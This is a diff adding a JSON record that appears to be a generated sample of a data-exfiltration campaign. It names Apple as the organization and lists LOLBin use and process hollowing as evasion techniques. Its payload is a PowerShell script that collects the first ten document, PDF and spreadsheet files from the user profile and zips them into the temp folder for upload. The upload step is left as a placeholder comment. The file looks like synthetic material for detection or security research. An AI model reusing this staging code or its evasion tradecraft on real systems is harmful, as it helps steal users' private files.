@@ -1,0 +1,11 @@
+{
+  "organization": "Apple",
+  "campaign_type": "data_exfiltration",
+  "evasion_techniques": [
+    "lolbin_usage",
+    "process_hollowing"
+  ],
+  "payload": "# HmnjtexkwVbK7tAZ16RW\n# Generated: 2025-11-03T12:20:52.710343\n# System: eOpCby5Ci3WB4TV\n# Process: qhzXO8dP2F3v\n\n\n# Data exfiltration\n$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10\n\nif ($sensitiveFiles) {\n    $e65p8zxVZip = \"$env:TEMP\\data.zip\"\n    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $e65p8zxVZip -Force\n    # Upload logic would go here\n}\n",
+  "generated_at": "2025-11-03T12:20:52.710350",
+  "signature": "b953f066bdeec3e77dc62aff2080ba370d48d426322530b1ee1090bf5364d24c"
+}
